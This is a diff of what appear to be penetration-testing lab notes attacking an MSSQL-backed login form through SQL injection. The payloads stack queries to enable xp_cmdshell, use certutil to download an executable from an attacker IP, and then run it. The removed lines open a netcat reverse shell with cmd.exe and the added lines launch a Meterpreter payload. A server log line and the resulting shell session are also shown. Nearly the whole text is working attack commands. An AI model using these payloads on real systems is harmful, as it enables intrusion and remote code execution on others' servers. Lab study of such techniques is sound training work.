@@ -63,14 +63,14 @@ UsernameTextBox=1';EXECUTE sp_configure 'show advanced options', 1;--
 UsernameTextBox=1';RECONFIGURE;--
 UsernameTextBox=1';EXECUTE sp_configure 'xp_cmdshell', 1;--
 UsernameTextBox=1';RECONFIGURE;--
-admin=1';EXEC xp_cmdshell "certutil.exe -urlcache -f http://192.168.45.210:8088/cute.exe C:/Temp/cute.exe";--
+UsernameTextBox=1';EXEC xp_cmdshell "certutil.exe -urlcache -f http://192.168.45.210:8088/met.exe C:\TEMP\met.exe";--
 ...
-192.168.215.121 - - [28/May/2024 08:05:44] "GET /Windows/nc.exe HTTP/1.1" 200 -
+192.168.215.121 - - [28/May/2024 08:05:44] "GET /met.exe HTTP/1.1" 200 -
 ...
 # Our https feedback with 200, means it is able to use SQLi!
 # Lets listen to 8443 and establish the connection with VM3
-admin=1';EXEC xp_cmdshell "C:/Temp/nc.exe 192.168.45.177 8443 -e cmd.exe";--
-# Go to the NC listener
+UsernameTextBox=1';EXEC xp_cmdshell "cmd /c C:\TEMP\met.exe";--
+# Go to the Metasplolit listener
 C:\Windows\system32>whoami
 nt service\mssql$sqlexpress
 C:\Windows\system32>hostname
